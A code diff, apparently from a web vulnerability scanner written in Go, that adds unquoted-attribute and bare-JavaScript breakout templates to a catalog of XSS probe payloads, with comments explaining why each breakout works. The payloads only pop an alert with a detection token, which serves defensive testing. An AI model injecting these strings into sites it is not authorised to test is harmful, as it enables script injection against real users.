@@ -152,12 +152,22 @@ var payloadCatalog = map[PayloadClass][]Payload{
 		{Class: PayloadXSS, Name: "attr-double-break", Template: `"><svg onload=alert("{{TOKEN}}")>`},
 		// Single-quoted attribute breakout. Same shape with `'`.
 		{Class: PayloadXSS, Name: "attr-single-break", Template: `'><svg onload=alert("{{TOKEN}}")>`},
+		// Unquoted attribute breakout. Inside `<a href=VALUE>` the parser
+		// stays in attribute-value-unquoted state until whitespace or `>`,
+		// so a bare `<svg ...>` doesn't form a tag - we close the host tag
+		// with `>` first, then inject.
+		{Class: PayloadXSS, Name: "attr-unquoted-break", Template: `><svg onload=alert("{{TOKEN}}")>`},
 		// JS double-quoted string breakout. `";` closes the string and
 		// inserts a new statement; `//` swallows whatever the original
 		// source had after our injection point.
 		{Class: PayloadXSS, Name: "js-string-double-break", Template: `";alert("{{TOKEN}}");//`},
 		// JS single-quoted string breakout.
 		{Class: PayloadXSS, Name: "js-string-single-break", Template: `';alert("{{TOKEN}}");//`},
+		// Bare JS for reflection landing in raw <script> text (not inside
+		// a string literal). Leading `;` safely terminates whatever
+		// statement or expression precedes the injection; `//` swallows
+		// the trailing source.
+		{Class: PayloadXSS, Name: "js-bare-break", Template: `;alert("{{TOKEN}}");//`},
 	},
 	PayloadSQLiError: {
 		// Single quotes are by far the most common dialect break: any
